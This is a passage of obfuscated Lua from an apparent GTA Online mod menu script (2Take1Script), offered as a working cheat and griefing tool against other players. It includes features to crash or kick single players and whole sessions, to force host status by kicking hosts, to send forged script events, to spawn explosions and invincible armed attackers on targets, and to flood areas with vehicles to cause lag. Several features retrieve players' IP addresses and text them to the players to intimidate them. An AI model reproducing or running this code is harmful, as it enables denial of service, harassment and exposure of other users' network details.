                    if bv(E) then
                        local bd = ped.get_vehicle_ped_is_using(aW(E))
                        if bd ~= 0 then
                            bd = entity.get_entity_model_hash(bd)
                            for bs = 1, #v do
                                if V[v[bs][1]].on and bd == v[bs][2] then
                                    n("Detected Blacklisted Vehicle " .. v[bs][1] .. " in Session!")
                                    bd = ped.get_vehicle_ped_is_using(aW(E))
                                    aP(bd, 100)
                                    if entity.get_entity_god_mode(bd) then
                                        aP(bd)
                                        entity.set_entity_god_mode(bd, false)
                                    end
                                    if not entity.get_entity_god_mode(bd) then
                                        n("Exploding User: " .. az(E))
                                        k(
                                            "Detected Blacklisted Vehicle " ..
                                                v[bs][1] .. " from user: " .. az(E) .. ", exploding it!",
                                            28
                                        )
                                        entity.set_entity_velocity(bd, v3())
                                        vehicle.set_vehicle_forward_speed(bd, 0)
                                        vehicle.set_vehicle_out_of_control(bd, false, true)
                                        fire.add_explosion(aZ(aW(E)), 59, false, true, 1, aW(E))
                                    end
                                end
                            end
                        end
                    end
                end
            end
            return aN(aO)
        end
    )
    V["veh_blacklist"].on = h["veh_blacklist"]
    for E = 1, #v do
        V[v[E][1]] =
            aG(
            "Block: " .. v[E][1],
            U["bl_veh"],
            function(aO)
                h[v[E][1]] = aO.on
            end
        )
        V[v[E][1]].on = h[v[E][1]]
    end
    U["bl_area"] = aC("Block Areas", U["lobby"]).id
    V["teleport_to_block"] =
        aG(
        "Teleport to Block",
        U["bl_area"],
        function(aO)
            h["teleport_to_block"] = aO.on
        end
    )
    V["teleport_to_block"].on = h["teleport_to_block"]
    aF(
        "Clear blocking Objects",
        U["bl_area"],
        function()
            b1(T["bl_objects"])
            T["bl_objects"] = {}
        end
    )
    U["bl_area_lsc"] = aC("Block LSCs", U["bl_area"]).id
    for E = 1, #A do
        aF(
            A[E][1],
            U["bl_area_lsc"],
            function()
                cd(A[E][2])
            end
        )
    end
    U["bl_area_casino"] = aC("Block Casino", U["bl_area"]).id
    for E = 1, #B do
        aF(
            B[E][1],
            U["bl_area_casino"],
            function()
                cd(B[E][2])
            end
        )
    end
    U["bl_area_mazebank"] = aC("Block Maze Bank", U["bl_area"]).id
    for E = 1, #C do
        aF(
            C[E][1],
            U["bl_area_mazebank"],
            function()
                cd(C[E][2])
            end
        )
    end
    U["bl_area_custom"] = aC("Custom Areas", U["bl_area"]).id
    for E = 1, #H do
        aF(
            H[E][1],
            U["bl_area_custom"],
            function()
                cd(H[E][2])
            end
        )
    end
    U["explode"] = aC("Explosion-Features", U["lobby"]).id
    V["laser_beam_explode_waypoint"] =
        aF(
        "Laser Beam Explode Waypoint",
        U["explode"],
        function()
            local cM = ui.get_waypoint_coord()
            if cM.x ~= 16000 then
                local cN = aZ(aX()).z + 175
                for E = cN, -50, -2 do
                    local bc = v3(cM.x, cM.y, E)
                    bc.x = math.floor(bc.x)
                    bc.y = math.floor(bc.y)
                    fire.add_explosion(bc, 59, true, false, 0, 0)
                    for bs = 1, 2 do
                        bc.x = math.random(bc.x - 3, bc.x + 3)
                        bc.y = math.random(bc.y - 3, bc.y + 3)
                        fire.add_explosion(bc, 59, true, false, 0, 0)
                    end
                    bc.x = math.random(bc.x - 6, bc.x + 6)
                    bc.y = math.random(bc.y - 6, bc.y + 6)
                    fire.add_explosion(bc, 8, true, false, 0, 0)
                    system.wait(0)
                end
            else
                k("No Waypoint found, set a waypoint first!")
            end
        end
    )
    V["explode_lobby"] =
        aH(
        "Random Explosions",
        "value_i",
        U["explode"],
        function(aO)
            if aO.on then
                local bc = v3()
                for E = 1, 5 do
                    bc.x = math.random(-2700, 2700)
                    bc.y = math.random(-3300, 7500)
                    bc.z = math.random(30, 90)
                    fire.add_explosion(bc, V["explode_lobby"].value_i, true, false, 0, 0)
                end
            end
            h["explode_lobby_value"] = V["explode_lobby"].value_i
            h["explode_lobby"] = aO.on
            return aN(aO)
        end
    )
    V["explode_lobby"].max_i = 74
    V["explode_lobby"].min_i = 0
    V["explode_lobby"].value_i = h["explode_lobby_value"]
    V["explode_lobby"].on = h["explode_lobby"]
    V["explode_lobby_shake"] =
        aG(
        "Shake Cam",
        U["explode"],
        function(aO)
            if aO.on then
                local bc = v3()
                for E = 1, 10 do
                    bc.x = math.random(-2700, 2700)
                    bc.y = math.random(-3300, 7500)
                    bc.z = math.random(30, 90)
                    fire.add_explosion(bc, 8, false, true, 20, 0)
                end
            end
            h["explode_lobby_shake"] = aO.on
            return aN(aO)
        end
    )
    V["explode_lobby_shake"].on = h["explode_lobby_shake"]
    U["sound"] = aC("Sound-Features", U["lobby"]).id
    V["sound_rape"] =
        aG(
        "Sound Rape",
        U["sound"],
        function(aO)
            if aO.on then
                for E = 0, 31 do
                    if bv(E) then
                        audio.play_sound_from_entity(2, "Wasted", aW(E), "DLC_IE_VV_General_Sounds")
                    end
                end
            end
            h["sound_rape"] = aO.on
            return aN(aO)
        end
    )
    V["sound_rape"].on = h["sound_rape"]
    aF(
        "Garage-Door Sound - Infinite Time",
        U["sound"],
        function()
            for E = 0, 31 do
                if bv(E) then
                    audio.play_sound_from_entity(2, "Garage_Door", aW(E), "DLC_HEISTS_GENERIC_SOUNDS")
                end
            end
        end
    )
    V["kill_all_peds"] =
        aG(
        "Kill all PEDs",
        U["lobby"],
        function(aO)
            if aO.on then
                local cO = ped.get_all_peds()
                for E = 1, #cO do
                    if not ped.is_ped_a_player(cO[E]) then
                        ped.set_ped_health(cO[E], 0)
                    end
                end
            end
            h["kill_all_peds"] = aO.on
            return aN(aO)
        end
    )
    V["kill_all_peds"].on = h["kill_all_peds"]
    V["disablecontrol"] =
        aG(
        "Disable Control from near Vehicles",
        U["lobby"],
        function(aO)
            if aO.on then
                for E = 0, 31 do
                    if bv(E) then
                        local bd = ped.get_vehicle_ped_is_using(aW(E))
                        if bd ~= 0 then
                            aP(bd)
                            vehicle.set_vehicle_forward_speed(bd, 25)
                            vehicle.set_vehicle_out_of_control(bd, false, true)
                        end
                    end
                end
            end
            h["disablecontrol"] = aO.on
            return aN(aO)
        end
    )
    V["disablecontrol"].on = h["disablecontrol"]
    U["lobby_bounty"] = aC("Bounty", U["lobby"]).id
    V["bounty_after_death"] =
        aH(
        "Set Bounty after Death",
        "value_i",
        U["lobby_bounty"],
        function(aO)
            h["bounty_after_death"] = aO.on
            h["bounty_after_death_value"] = aO.value_i
            if aO.on then
                local cP = 0
                if V["anonymous_bounty"].on then
                    cP = 1
                end
                for E = 0, 31 do
                    if bv(E) then
                        if player.get_player_health(E) == 0 then
                            k(az(E) .. " is dead!\nSetting bounty...", 33)
                            n(az(E) .. " is dead!")
                            n("Setting bounty...")
                            for cH = 0, 31 do
                                if aA(cH) ~= -1 then
                                    aU(
                                        544453591,
                                        cH,
                                        {
                                            69,
                                            E,
                                            1,
                                            V["bounty_after_death"].value_i,
                                            0,
                                            cP,
                                            0,
                                            0,
                                            0,
                                            0,
                                            0,
                                            0,
                                            0,
                                            0,
                                            0,
                                            0,
                                            0,
                                            0,
                                            0,
                                            script.get_global_i(1650640 + 9),
                                            script.get_global_i(1650640 + 10)
                                        }
                                    )
                                end
                            end
                            system.wait(1500)
                        end
                    end
                end
            end
            return aN(aO)
        end
    )
    V["bounty_after_death"].on = h["bounty_after_death"]
    V["bounty_after_death"].min_i = 0
    V["bounty_after_death"].max_i = 10000
    V["bounty_after_death"].value_i = h["bounty_after_death_value"]
    V["anonymous_bounty"] =
        aG(
        "Anonymous Bounty",
        U["lobby_bounty"],
        function(aO)
            h["anonymous_bounty"] = aO.on
        end
    )
    V["anonymous_bounty"].on = h["anonymous_bounty"]
    for E = 1, #O do
        aF(
            O[E] .. "$",
            U["lobby_bounty"],
            function()
                local cP = 0
                if V["anonymous_bounty"].on then
                    cP = 1
                end
                for cH = 0, 31 do
                    if aA(cH) ~= -1 then
                        for cQ = 0, 31 do
                            if aA(cQ) ~= -1 then
                                aU(
                                    544453591,
                                    cQ,
                                    {
                                        69,
                                        cH,
                                        1,
                                        O[E],
                                        0,
                                        cP,
                                        0,
                                        0,
                                        0,
                                        0,
                                        0,
                                        0,
                                        0,
                                        0,
                                        0,
                                        0,
                                        0,
                                        0,
                                        0,
                                        script.get_global_i(1650640 + 9),
                                        script.get_global_i(1650640 + 10)
                                    }
                                )
                            end
                        end
                    end
                end
            end
        )
    end
    U["lobby_se"] = aC("Script Events", U["lobby"]).id
    U["lobby_se_custom"] = aC("Custom Script Events", U["lobby_se"]).id
    aF(
        "Enter Custom Script Event with Parameters",
        U["lobby_se_custom"],
        function()
            local aQ, cR, cS
            local cT = {}
            aQ, cR = input.get("Enter Custom SE (DEC)", "", 32, 3)
            while aQ == 1 do
                system.wait(0)
                aQ, cR = input.get("Enter Custom SE (DEC)", "", 32, 3)
            end
            if aQ == 2 then
                k("Aborted sending Custom Event...", 100)
                return HANDLER_POP
            end
            while cS ~= "#" do
                aQ, cS = input.get("Enter Parameter (DEC), to EXIT and send, enter #", "", 32, 0)
                while aQ == 1 do
                    system.wait(0)
                    aQ, cS = input.get("Enter Parameter (DEC), to EXIT and send, enter #", "", 32, 0)
                end
                if aQ == 2 then
                    k("Aborted sending Custom Event...", 100)
                    return HANDLER_POP
                end
                if cS == "#" then
                    break
                end
                cS = tonumber(cS)
                if type(cS) == "number" then
                    cT[#cT + 1] = cS
                else
                    k("Aborted sending Custom Event...", 100)
                    return HANDLER_POP
                end
            end
            for E = 0, 31 do
                if bv(E) then
                    aU(cR, E, cT)
                end
            end
            k("Sent Custom Script Event with Parameters to Players.", 100)
        end
    )
    for E = 1, #G do
        aF(
            G[E][1],
            U["lobby_se_custom"],
            function()
                k("Sent Custom Script Event to Players.", 100)
                for cE = 0, 31 do
                    if bv(cE) then
                        for bs = 1, #G[E][2] do
                            aU(G[E][2][bs][1], cE, G[E][2][bs][2])
                        end
                    end
                end
            end
        )
    end
    U["lobby_send_2_mission"] = aC("Send all to Mission", U["lobby_se"]).id
    for E = 1, #q do
        aF(
            "Send to " .. q[E][1],
            U["lobby_send_2_mission"],
            function()
                ce(true, 0x692CC4BB, q[E][2])
                k("Sent Session to Mission")
            end
        )
    end
    U["lobby_ceo"] = aC("CEO all Player", U["lobby_se"]).id
    for E = 1, 3 do
        aF(
            r[E][1],
            U["lobby_ceo"],
            function()
                ce(true, r[E][2], r[E][3], r[E][4], r[E][5])
                k("Modified Players CEO")
            end
        )
    end
    aF(
        "Block - Passive",
        U["lobby_se"],
        function()
            ce(true, 0x54BAD868, {1, 1})
            k("Blocked all Players from activating Passive.")
        end
    )
    aF(
        "UN-Block - Passive",
        U["lobby_se"],
        function()
            ce(true, 0x54BAD868, {2, 0})
            k("UN-Blocked all Players from Passive.")
        end
    )
    U["lobby_sms"] =
        aC(
        "Send SMSs to Lobby",
        U["lobby"],
        function()
            k("Players must have Voice-Chat enabled to recive SMS.")
        end
    ).id
    aF(
        "Custom SMS input",
        U["lobby_sms"],
        function()
            local aQ, cU = input.get("Enter Custom SMS", "", 128, 0)
            while aQ == 1 do
                system.wait(0)
                aQ, cU = input.get("Enter Custom SMS", "", 128, 0)
            end
            if aQ == 2 then
                return HANDLER_POP
            end
            for E = 0, 31 do
                if bv(E) then
                    player.send_player_sms(E, cU)
                end
            end
        end
    )
    aF(
        "Send SCID & IP",
        U["lobby_sms"],
        function()
            for E = 0, 31 do
                if bv(E) then
                    local bj = tostring(aA(E))
                    local cL = player.get_player_ip(E)
                    cL = string.format("%i.%i.%i.%i", cL >> 24 & 0xff, cL >> 16 & 0xff, cL >> 8 & 0xff, cL & 0xff)
                    player.send_player_sms(E, "R*SCID: " .. bj .. "~n~IP: " .. cL)
                end
            end
        end
    )
    for E = 1, #P do
        aF(
            P[E],
            U["lobby_sms"],
            function()
                for cH = 0, 31 do
                    if bv(cH) then
                        player.send_player_sms(cH, P[E])
                    end
                end
            end
        )
    end
    U["lobby_malicious"] = aC("Malicious", U["lobby"]).id
    V["karma_se"] =
        aG(
        "Karma every Script Event",
        U["lobby_malicious"],
        function(aO)
            if cr == nil then
                cr = hook.register_script_event_hook(cp)
            else
                hook.remove_script_event_hook(cr)
            end
            h["karma_se"] = aO.on
        end
    )
    V["karma_se"].on = h["karma_se"]
    V["punish_aliens"] =
        aG(
        "Punish Aliens in Lobby",
        U["lobby_malicious"],
        function(aO)
            h["punish_aliens"] = aO.on
            if aO.on then
                local time = utils.time_ms() + 15000
                while time > utils.time_ms() do
                    h["punish_aliens"] = aO.on
                    system.yield(150)
                end
                for E = 0, 31 do
                    if bv(E) then
                        local cz = 0
                        if player.is_player_female(E) then
                            if
                                ped.get_ped_drawable_variation(aW(E), 1) == 134 and
                                    (ped.get_ped_texture_variation(aW(E), 1) == 8 or
                                        ped.get_ped_texture_variation(aW(E), 1) == 9)
                             then
                                cz = cz + 1
                            end
                            if
                                ped.get_ped_drawable_variation(aW(E), 4) == 113 and
                                    (ped.get_ped_texture_variation(aW(E), 4) == 8 or
                                        ped.get_ped_texture_variation(aW(E), 4) == 9)
                             then
                                cz = cz + 1
                            end
                            if
                                ped.get_ped_drawable_variation(aW(E), 6) == 87 and
                                    (ped.get_ped_texture_variation(aW(E), 6) == 8 or
                                        ped.get_ped_texture_variation(aW(E), 6) == 9)
                             then
                                cz = cz + 1
                            end
                            if
                                ped.get_ped_drawable_variation(aW(E), 11) == 287 and
                                    (ped.get_ped_texture_variation(aW(E), 11) == 8 or
                                        ped.get_ped_texture_variation(aW(E), 11) == 9)
                             then
                                cz = cz + 1
                            end
                        else
                            if
                                ped.get_ped_drawable_variation(aW(E), 1) == 134 and
                                    (ped.get_ped_texture_variation(aW(E), 1) == 8 or
                                        ped.get_ped_texture_variation(aW(E), 1) == 9)
                             then
                                cz = cz + 1
                            end
                            if
                                ped.get_ped_drawable_variation(aW(E), 4) == 106 and
                                    (ped.get_ped_texture_variation(aW(E), 4) == 8 or
                                        ped.get_ped_texture_variation(aW(E), 4) == 9)
                             then
                                cz = cz + 1
                            end
                            if
                                ped.get_ped_drawable_variation(aW(E), 6) == 83 and
                                    (ped.get_ped_texture_variation(aW(E), 6) == 8 or
                                        ped.get_ped_texture_variation(aW(E), 6) == 9)
                             then
                                cz = cz + 1
                            end
                            if
                                ped.get_ped_drawable_variation(aW(E), 11) == 274 and
                                    (ped.get_ped_texture_variation(aW(E), 11) == 8 or
                                        ped.get_ped_texture_variation(aW(E), 11) == 9)
                             then
                                cz = cz + 1
                            end
                        end
                        if cz > 1 then
                            n(az(E) .. " is a useless alien!")
                            n("Guilty Level: " .. cz)
                            k(az(E) .. " is a useless alien! Punishing him!", 23)
                            player.send_player_sms(E, "Delete your stupid alien Outfit!")
                            bD(I[5][2], E)
                            bD(I[8][2], E)
                            fire.add_explosion(aZ(aW(E)), 59, false, true, 1, aW(E))
                            fire.add_explosion(aZ(aW(E)), 8, true, false, 1, aW(E))
                            fire.add_explosion(aZ(aW(E)), 60, true, false, 1, aW(E))
                            fire.add_explosion(aZ(aW(E)), 8, true, false, 1, aW(E))
                        end
                    end
                end
            end
            return aN(aO)
        end
    )
    V["punish_aliens"].on = h["punish_aliens"]
    aF(
        "Kick all Players",
        U["lobby_malicious"],
        function()
            bw(true)
        end
    )
    aF(
        "Host Kick All",
        U["lobby_malicious"],
        function()
            if network.network_is_host() then
                for E = 0, 31 do
                    if bv(E) then
                        network.network_session_kick_player(E)
                    end
                end
            else
                k("You are not Session-Host!")
            end
        end
    )
    V["force_host"] =
        aG(
        "Kick Hosts until You become Host",
        U["lobby_malicious"],
        function(aO)
            if aO.on then
                local time = utils.time_ms() + 7500
                while time > utils.time_ms() do
                    system.yield(250)
                    h["force_host"] = aO.on
                end
                local cV = player.get_host()
                if cV ~= aV() and aA(cV) ~= -1 then
                    n("You are not Host!")
                    n(az(cV) .. ":" .. aA(cV) .. " is Host!")
                    k(az(cV) .. " is Host!")
                    bw(false, cV)
                end
            end
            h["force_host"] = aO.on
            return aN(aO)
        end
    )
    V["force_host"].on = h["force_host"]
    aF(
        "Crash Session",
        U["lobby_malicious"],
        function()
            n("Crashing Session...")
            menu.set_menu_can_navigate(false)
            a7 = entity.get_entity_model_hash(aX())
            for E = 1, 11 do
                a8[E] = ped.get_ped_texture_variation(aX(), E)
            end
            for E = 1, 11 do
                a9[E] = ped.get_ped_drawable_variation(aX(), E)
            end
            bm(0x471BE4B2, nil, nil, nil, true)
            aa = true
            system.yield(5000)
            cj()
            menu.set_menu_can_navigate(true)
            n("Done.")
        end
    )
    aF("Fix loading screen after Crash", U["lobby_malicious"], cj)
    if h["2t1s_p"] then
        U["opl_parent"] = aJ("2Take1Script", 0).id
    end
    aL(
        "Remote Control Vehicle",
        U["opl_parent"],
        function(aO, cW)
            local cX = menu.get_player_feature(aO.id)
            if aO.on then
                if aj ~= cW then
                    aj = cW
                    for E = 1, #cX.feats do
                        if E - 1 ~= cW and cX.feats[E].on then
                            cX.feats[E].on = false
                        end
                    end
                end
                local bd = ped.get_vehicle_ped_is_using(aW(cW))
                if bd ~= 0 then
                    if ah == nil then
                        local cb = entity.get_entity_model_hash(bd)
                        ah = vehicle.create_vehicle(cb, a_(), 0, true, false)
                        ped.set_ped_into_vehicle(aX(), ah, -1)
                        system.wait(50)
                    end
                    entity.set_entity_visible(ah, false)
                    if entity.get_entity_attached_to(bd) ~= ah then
                        aP(ah)
                        entity.set_entity_velocity(ah, v3())
                        b0(ah, aZ(bd))
                        system.wait(0)
                        entity.set_entity_rotation(ah, entity.get_entity_rotation(bd))
                        aP(bd)
                        entity.set_entity_velocity(bd, v3())
                        entity.set_entity_max_speed(bd, 0)
                        vehicle.set_vehicle_out_of_control(bd, false, false)
                        entity.attach_entity_to_entity(bd, ah, 0, v3(), v3(), true, false, false, 0, true)
                    end
                    return HANDLER_CONTINUE
                else
                    for E = 1, #cX.feats do
                        if cX.feats[E].on then
                            cX.feats[E].on = false
                        end
                    end
                    k("Target is not in a Vehicle!")
                    return HANDLER_POP
                end
            end
            if ah ~= nil then
                ped.clear_ped_tasks_immediately(aX())
                b1({ah})
                ah = nil
            end
            return HANDLER_POP
        end
    )
    aK(
        "Repair Vehicle",
        U["opl_parent"],
        function(aO, cW)
            local bd = ped.get_vehicle_ped_is_using(aW(cW))
            if bd ~= 0 then
                aP(bd)
                vehicle.set_vehicle_fixed(bd)
                vehicle.set_vehicle_deformation_fixed(bd)
                vehicle.set_vehicle_can_be_visibly_damaged(bd, false)
                n("Repaired Vehicle.")
            end
        end
    )
    aL(
        "Waypoint Player",
        U["opl_parent"],
        function(aO, cW)
            local cX = menu.get_player_feature(aO.id)
            if aO.on then
                if aq ~= cW then
                    aq = cW
                    for E = 1, #cX.feats do
                        if E - 1 ~= cW and cX.feats[E].on then
                            cX.feats[E].on = false
                        end
                    end
                end
                local bc = aZ(aW(cW))
                ui.set_new_waypoint(v2(bc.x, bc.y))
                system.wait(500)
                return HANDLER_CONTINUE
            end
            system.wait(10)
            ui.set_waypoint_off()
            system.wait(10)
            return HANDLER_POP
        end
    )
    aK(
        "Modify Speed (0-500)",
        U["opl_parent"],
        function(aO, cW)
            local bd = ped.get_vehicle_ped_is_using(aW(cW))
            if bd ~= 0 then
                local aQ, cK = input.get("Enter modified Speed (0-500)", "", 10, 3)
                while aQ == 1 do
                    system.wait(0)
                    aQ, cK = input.get("Enter modified Speed (0-500)", "", 10, 3)
                end
                if aQ == 2 then
                    return HANDLER_POP
                end
                cK = tonumber(cK)
                if cK < 0 or cK > 500 then
                    k("Invalid Speed.")
                    return HANDLER_POP
                end
                k("Setting modified Speed.")
                aP(bd)
                entity.set_entity_max_speed(bd, cK)
                vehicle.modify_vehicle_top_speed(bd, cK)
            end
        end
    )
    U["attach"] = aJ("Attach Objects", U["opl_parent"]).id
    aK(
        "Attach Entity from Aim",
        U["attach"],
        function(aO, id)
            local cY = player.get_entity_player_is_aiming_at(aV())
            if cY ~= 0 then
                bD({{cY, 0, {0, 0, 0}, {0, 0, 0}}}, id, true)
            else
                k("No Entity found. Aim @Entity to attach it to Player.")
            end
        end
    )
    aK(
        "Clear Entitys",
        U["attach"],
        function()
            n("Clearing Attachments.")
            b1(T["attach_obj"])
            T["attach_obj"] = {}
            k("Cleared all Attachment Entitys.")
        end
    )
    aK("---------------------------------------", U["attach"])
    for E = 1, #I do
        aK(
            I[E][1],
            U["attach"],
            function(aO, id)
                bD(I[E][2], id)
            end
        )
    end
    U["opl_se"] = aJ("Script-Events", U["opl_parent"]).id
    U["opl_se_custom"] = aJ("Custom Script Events", U["opl_se"]).id
    aK(
        "Enter Custom Script Event with Parameters",
        U["opl_se_custom"],
        function(aO, id)
            local aQ, cR, cS
            local cT = {}
            aQ, cR = input.get("Enter Custom SE (DEC)", "", 32, 3)
            while aQ == 1 do
                system.wait(0)
                aQ, cR = input.get("Enter Custom SE (DEC)", "", 32, 3)
            end
            if aQ == 2 then
                k("Aborted sending Custom Event...", 93)
                return HANDLER_POP
            end
            while cS ~= "#" do
                aQ, cS = input.get("Enter Parameter (DEC), to EXIT and send, enter #", "", 32, 0)
                while aQ == 1 do
                    system.wait(0)
                    aQ, cS = input.get("Enter Parameter (DEC), to EXIT and send, enter #", "", 32, 0)
                end
                if aQ == 2 then
                    k("Aborted sending Custom Event...", 93)
                    return HANDLER_POP
                end
                if cS == "#" then
                    break
                end
                cS = tonumber(cS)
                if type(cS) == "number" then
                    cT[#cT + 1] = cS
                else
                    k("Aborted sending Custom Event...", 93)
                    return HANDLER_POP
                end
            end
            aU(cR, id, cT)
            k("Sent Custom Script Event with Parameters to Player.", 93)
        end
    )
    for E = 1, #G do
        aK(
            G[E][1],
            U["opl_se_custom"],
            function(aO, id)
                k("Sent Custom Script Event to Player.", 93)
                for bs = 1, #G[E][2] do
                    aU(G[E][2][bs][1], id, G[E][2][bs][2])
                end
            end
        )
    end
    aK(
        "Block - Passive",
        U["opl_se"],
        function(aO, id)
            ce(false, 0x54BAD868, {1, 1}, nil, nil, id)
            k("Blocked Player from activating Passive.")
        end
    )
    aK(
        "UN-Block - Passive",
        U["opl_se"],
        function(aO, id)
            ce(false, 0x54BAD868, {2, 0}, nil, nil, id)
            k("UN-Blocked Player from Passive.")
        end
    )
    U["opl_send_2_mission"] = aJ("Send Player to Mission", U["opl_se"]).id
    for E = 1, #q do
        aK(
            "Send to " .. q[E][1],
            U["opl_send_2_mission"],
            function(aO, id)
                ce(false, 0x692CC4BB, q[E][2], nil, nil, id)
                k("Sent Player to Mission")
            end
        )
    end
    U["opl_ceo"] = aJ("CEO", U["opl_se"]).id
    for E = 1, 3 do
        aK(
            r[E][1],
            U["opl_ceo"],
            function(aO, id)
                ce(false, r[E][2], r[E][3], r[E][4], r[E][5], id)
                k("Modified Players CEO")
            end
        )
    end
    U["opl_assassins_peds"] = aJ("Send PEDs (Assassins)", U["opl_parent"]).id
    aK(
        "Clear PEDs",
        U["opl_assassins_peds"],
        function()
            b1(T["peds"])
            T["peds"] = {}
        end
    )
    for E = 1, #u do
        aK(
            "Spawn " .. u[E][1] .. " (3x)",
            U["opl_assassins_peds"],
            function(aO, id)
                n("Spawning PEDs.")
                ak = id
                local cb = u[E][2]
                local cZ = u[E][3]
                local bc = v3()
                aR(cb)
                for E = 1, 3 do
                    bc = aZ(aW(id))
                    bc.x = bc.x + math.random(-10, 10)
                    bc.y = bc.y + math.random(-10, 10)
                    T["peds"][#T["peds"] + 1] = ped.create_ped(cZ, cb, bc, 0.0, true, false)
                    if cZ ~= 28 then
                        weapon.give_delayed_weapon_to_ped(T["peds"][#T["peds"]], 0xDBBD7280, 0, 0)
                    end
                    ped.set_ped_max_health(T["peds"][#T["peds"]], 25000000.0)
                    ped.set_ped_health(T["peds"][#T["peds"]], 25000000.0)
                    ped.set_ped_combat_attributes(T["peds"][#T["peds"]], 46, true)
                    ped.set_ped_combat_ability(T["peds"][#T["peds"]], 2)
                    ped.set_ped_config_flag(T["peds"][#T["peds"]], 187, 0)
                    ped.set_ped_can_ragdoll(T["peds"][#T["peds"]], false)
                    for cH = 1, 26 do
                        ped.set_ped_ragdoll_blocking_flags(T["peds"][#T["peds"]], cH)
                    end
                    ai.task_combat_ped(T["peds"][#T["peds"]], aW(id), 0, 16)
                end
                aT(cb)
                n("Done.")
            end
        )
    end
    aK(
        "TP to Player",
        U["opl_parent"],
        function(aO, id)
            b9(aZ(aW(id)), 3)
        end
    )
    aK(
        "TP Players Vehicle to me",
        U["opl_parent"],
        function(aO, id)
            local bd = ped.get_vehicle_ped_is_using(aW(id))
            aP(bd)
            entity.set_entity_velocity(bd, v3())
            b0(bd, a_())
        end
    )
    aK(
        "Add Player to Blacklist",
        U["opl_parent"],
        function(aO, id)
            local bj = aA(id)
            if bj == aA(aV()) or bj == -1 then
                k("Choose valid Player.")
            else
                local D = io.open(a .. "\\2Take1Blacklist.cfg", "a")
                io.output(D)
                io.write(bj .. " " .. az(id) .. "\n")
                io.close(D)
                k("Player " .. az(id) .. " added to Blocklist.", 48)
                n("Player " .. az(id) .. " with SCID: " .. bj .. " added to Blacklist.")
            end
        end
    )
    U["opl_misc"] = aJ("Miscellaneous", U["opl_parent"]).id
    U["opl_sms"] =
        aJ(
        "Send SMSs to Player",
        U["opl_misc"],
        function()
            k("Player must have Voice-Chat enabled to recive SMS.")
        end
    ).id
    aK(
        "Custom SMS input",
        U["opl_sms"],
        function(aO, id)
            local aQ, cU = input.get("Enter Custom SMS", "", 128, 0)
            while aQ == 1 do
                system.yield(0)
                aQ, cU = input.get("Enter Custom SMS", "", 128, 0)
            end
            if aQ == 2 then
                return HANDLER_POP
            end
            player.send_player_sms(id, cU)
        end
    )
    aK(
        "Send his SCID & IP",
        U["opl_sms"],
        function(aO, id)
            local bj = tostring(aA(id))
            local cL = player.get_player_ip(id)
            cL = string.format("%i.%i.%i.%i", cL >> 24 & 0xff, cL >> 16 & 0xff, cL >> 8 & 0xff, cL & 0xff)
            player.send_player_sms(id, "R*SCID: " .. bj .. "~n~IP: " .. cL)
        end
    )
    for E = 1, #P do
        aK(
            P[E],
            U["opl_sms"],
            function(aO, id)
                player.send_player_sms(id, P[E])
            end
        )
    end
    aK(
        "Falling Asteroids",
        U["opl_misc"],
        function(aO, id)
            menu.set_menu_can_navigate(false)
            local bc = v3()
            local c_
            aR(3751297495)
            for E = 1, 25 do
                bc = aZ(aW(id))
                bc.x = math.random(math.floor(bc.x - 80), math.floor(bc.x + 80))
                bc.y = math.random(math.floor(bc.y - 80), math.floor(bc.y + 80))
                bc.z = bc.z + math.random(45, 90)
                c_ = math.random(-125, 25)
                T["asteroids"][#T["asteroids"] + 1] = object.create_object(3751297495, bc, true, true)
                entity.apply_force_to_entity(T["asteroids"][#T["asteroids"]], 3, 0, 0, c_, 0, 0, 0, true, true)
            end
            aT(3751297495)
            for E = 1, 5 do
                for E = 1, 25 do
                    bc = aZ(T["asteroids"][#T["asteroids"] - 25 + E])
                    fire.add_explosion(bc, 8, true, false, 0, 0)
                    system.yield(50)
                end
            end
            menu.set_menu_can_navigate(true)
        end
    )
    aK(
        "Delete Asteroids",
        U["opl_misc"],
        function()
            n("Clearing Asteroids.")
            b1(T["asteroids"])
            T["asteroids"] = {}
            k("Cleared all Asteroids.")
        end
    )
    aK(
        "Apply random Force to Player",
        U["opl_misc"],
        function(aO, id)
            local d0 = aW(id)
            if ped.is_ped_in_any_vehicle(d0) then
                d0 = ped.get_vehicle_ped_is_using(d0)
            else
                k("It works better, if target is in a Vehicle.")
            end
            aP(d0)
            local d1 = entity.get_entity_velocity(d0)
            for E = 1, 5 do
                d1.x = math.random(math.floor(d1.x - 50), math.floor(d1.x + 50))
                d1.y = math.random(math.floor(d1.y - 50), math.floor(d1.y + 50))
                d1.z = math.random(math.floor(d1.z - 50), math.floor(d1.z + 50))
                entity.set_entity_velocity(d0, d1)
                system.wait(10)
            end
        end
    )
    aK(
        "Trap in Prison",
        U["opl_misc"],
        function(aO, id)
            local bc = aZ(aW(id))
            bc.z = bc.z - 5
            entity.set_entity_rotation(object.create_object(1125864094, bc, true, false), v3(0, 90, 0))
        end
    )
    U["opl_bounty"] = aJ("Bounty", U["opl_parent"]).id
    for E = 1, #O do
        aK(
            O[E] .. "$",
            U["opl_bounty"],
            function()
                local cP = 0
                if V["anonymous_bounty"].on then
                    cP = 1
                end
                for cH = 0, 31 do
                    if aA(cH) ~= -1 then
                        aU(
                            544453591,
                            cH,
                            {
                                69,
                                id,
                                1,
                                O[E],
                                0,
                                cP,
                                0,
                                0,
                                0,
                                0,
                                0,
                                0,
                                0,
                                0,
                                0,
                                0,
                                0,
                                0,
                                0,
                                script.get_global_i(1650640 + 9),
                                script.get_global_i(1650640 + 10)
                            }
                        )
                    end
                end
            end
        )
    end
    U["opl_lag_area"] =
        aJ(
        "Lag Area with Vehicles",
        U["opl_parent"],
        function()
            k("DANGEROUS! ONLY USE WITH CAUTION!", 208)
        end
    ).id
    for E = 1, #K do
        aK(
            "Lag / Rain Area with " .. K[E][1],
            U["opl_lag_area"],
            function(aO, id)
                bI(id, K[E][2])
            end
        )
    end
    aK(
        "Delete Vehicles",
        U["opl_lag_area"],
        function()
            n("Clearing Vehicles.")
            b1(T["lag_area"])
            T["lag_area"] = {}
            k("Cleared Vehicles.")
        end
    )
    U["opl_malicious"] = aJ("Malicious (Kick / Crash)", U["opl_parent"]).id
    aK(
        "Kick Player",
        U["opl_malicious"],
        function(aO, id)
            bw(false, id)
        end
    )
    aK(
        "Host Kick Player",
        U["opl_malicious"],
        function(aO, id)
            if network.network_is_host() then
                network.network_session_kick_player(id)
            else
                k("You are not Session-Host!")
            end
        end
    )
    aK(
        "Crash Player",
        U["opl_malicious"],
        function(aO, id)
            bJ(id)
        end
    )
    U["chat"] = aC("Chat-Features", U["parent"])
    U["chat"].hidden = h["chat_hidden"]
    U["chat"] = U["chat"].id
